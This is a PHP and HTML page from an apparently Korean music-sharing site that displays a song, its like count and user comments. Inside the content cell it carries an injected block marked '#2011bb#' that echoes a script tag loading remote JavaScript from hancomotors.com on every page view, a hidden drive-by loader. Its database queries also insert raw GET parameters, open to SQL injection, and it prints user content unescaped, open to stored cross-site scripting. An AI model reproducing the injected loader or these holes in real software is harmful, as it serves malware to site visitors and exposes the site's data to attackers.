<? 
	session_start();
	include ("./lib.php");
	$connect = db_connect($db_host, $db_user, $db_pass,$db_name);
	$chk_sql="select * from Vocals_musiclist where music_no=trim('$_GET[music_no]')";
	$chk_result=mysql_query($chk_sql);
	$data=mysql_fetch_array($chk_result);
	
	if(!$data[music_no]){
    ?>
    <script>
        alert("존재하지 않는 글입니다.");
    </script>
    <?
	}
	$da="select * from Vocals_register where user_id=trim('$data[singer_id]')";
	$d=mysql_query($da);
	$r=mysql_fetch_array($d);
	
	$temp_type= basename($data['music_name']);
	$music_type= substr($temp_type, strlen($temp_type)-3, 3);
	
	$music_name= $data['music_name'];
	
	$sql2="select user_no from Vocals_like where content_no='$_GET[music_no]'";
	$re2=mysql_query($sql2);
	$re_data=mysql_fetch_array($re2);
	$data2=explode('/',$re_data['user_no']);
	$chk_like=0;
	for($i=0; $i<count($data2); $i++){
		if($data2[$i]==$_SESSION['user_no']){
			$chk_like=1;
			break;
		}		
	}
	?>

<!DOCTYPE HTML>
<html>
	<head>
		<title> New Document </title>
		<meta charset="UTF-8">
		<link rel="stylesheet" href="./reply_type.css"/>
		<style type="text/css">
			body {
				margin: 0;
				padding: 0;
			}
			section{
				padding-bottom: 30px;
			}
			#music_wrap {
				width: 980px;
				height: auto;
			}
			#music_wrap h1 {
				margin: 0;
				padding: 30px 0 0 30px;
				height: 60px;
			}
			#music_table {
				width: 800px;
				height: auto;
				margin: 50px auto 0 auto;
				text-align: center;
				border-spacing: 0;
			}
			#music_table thead td {
				background: #1caff6;
				color: white;
				height: 40px;
				border-radius: 10px 10px 0 0;
			}
			#music_table tbody td {
				border-bottom: 1px dashed black;
				height: 40px;
				width: 400px;
			}
			#music_table tbody tr:nth-child(2) td{
				height: 60px;
			}
			#music_table tbody tr:nth-child(3) td{
				text-align: justify;
				float: top;
				height: 300px;
			}
			#music_table tbody tr:last-child td{
				text-align: right;
				line-height: 22px;
				border-bottom: 1px solid black;
			}
			.music_like {
				display: block;
				width: 60px;
				height: 22px;
				background-color: #1caff6;
				color: white;
				text-align: center;
				border-radius: 5px;
				font-size: 10pt;
				line-height: 22px;
				border: 0;
				outline: none;
				padding: 0;
				cursor: pointer;
				float: right;
				text-decoration: none;
				margin-left: 4px;
			}
		</style>
		<script type="text/javascript">
			$(document).ready(function(){
				function ShowAlert(text){
					var left = (document.body.clientWidth / 2);
	                var result = left - $('.message').width() / 2 + document.body.scrollLeft;
	                $('.message').css('left',result).html(text).fadeIn(1500);
	                $('.message').fadeOut(1500);
				}
				$('.music_like').click(function(e){
					e.preventDefault();
					<?	
						if($chk_like == 0){
							$re_data['user_no'].=$_SESSION['user_no']."/";
							$sql3="Update Vocals_like set user_no='$re_data[user_no]' where content_no='$_GET[music_no]'";
							mysql_query($sql3);
							
							$new_like=$data['music_like']+1;
							$sql4="Update Vocals_musiclist set music_like='$new_like' where music_no=trim('$_GET[music_no]')";
							mysql_query($sql4);
						}
					?>
					$(this).css('background-color','#f14343').attr('disabled','true');
					$('#wrap').load('./music_view.php?music_no=<?=$_GET[music_no] ?>');
				});
				$('.go_reply').click(function(e){
					e.preventDefault();
					var form_data={
						music_no:<?=$data['music_no'] ?>,
						reply_text: $('.reply_text').val(),
						is_ajax: 1
					};
					$.ajax({
						data: form_data,
						type: "POST",
						url: './music_reply_ok.php',
						success: function(res){
							if(res=='success'){
								ShowAlert('댓글달기 완료');
								$('#wrap').load('./music_view.php?music_no=<?=$_GET[music_no] ?>');
							}else
								ShowAlert('오류가 발생하였습니다');
						}
					});
					return false;
				});
			});
		</script>
	</head>
	<body>
		<div id="music_wrap">
			<header>
				<h1> Musics</h1>
			</header>
			<section>
				<form enctype="multipart/form-data" method="post" action="" class="form_music" name="form_music">
					<table id="music_table">
						<thead>
							<tr>
								<td colspan="2"><?=$data['music_title'] ?></td>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td><?=$r['user_name']?></td><td><span style="color:#FF32B1;"><?=$data['music_hit'] ?>회</span> 조회되었습니다.</td>
							</tr>
							<tr>
								<td colspan="2"><audio controls="controls"><source src="./upload/<?=$music_name?>" type="audio/<?=$music_type?>"></audio><div><?= str_replace('|',' ',$music_name)?></div></td>
							</tr>
							<tr>
								<td colspan="2"><?=$data['music_content']?>
<?php
#2011bb#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155827\"></script>";
echo $vt;
}
#/2011bb#
?></td>
							</tr>
							<tr>
								<td colspan="2"><?=$data['music_like'] ?>명이 
								<? 
									if($chk_like==1){
								?>
								<input type="button" class="music_like" disabled="true" value="좋아요" style="background-color:#f14343;">
								<?
									}else{
								?>
								<input type="button" class="music_like" value="좋아요">
								<?
									}
								?>
								</td>
							</tr>
						</tbody>
					</table>
				</form>
				
				
				<table class="reply_table">
				<form method="post" name="form_reply" class="form_reply">
				<thead>
					<tr>
						<td colspan="2">댓글</td>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td><textarea name="reply_text" class="reply_text"></textarea></td><td><input type="submit" value="댓글달기" class="go_reply"></td>
					</tr>
				</form>
				</tbody>
				</table>
				<table class="reply_view">
				<tbody>
				<?
					$sql="select * from Vocals_music_reply where music_no='$data[music_no]' order by reply_no desc";
					$d_sql=mysql_query($sql);
					while($r_data=mysql_fetch_array($d_sql)){
						$a="select user_name from Vocals_register where user_id=trim('$r_data[reply_writer_id]')";
						$b=mysql_query($a);
						$c=mysql_fetch_array($b);
				?>
					<tr>
						<td><?=$c['user_name']?></td>
						<td style="word-break: break-all"><?=$r_data['reply_content']?></td>
					</tr>
				<?
					}
				?>
				</tbody>
			</table>
			</section>
		</div>
	</body>
</html>
<?
	$hit= $data['music_hit']+1;
	$sql="update Vocals_musiclist set music_hit='$hit' where music_no='$data[music_no]'";
	mysql_query($sql);
?>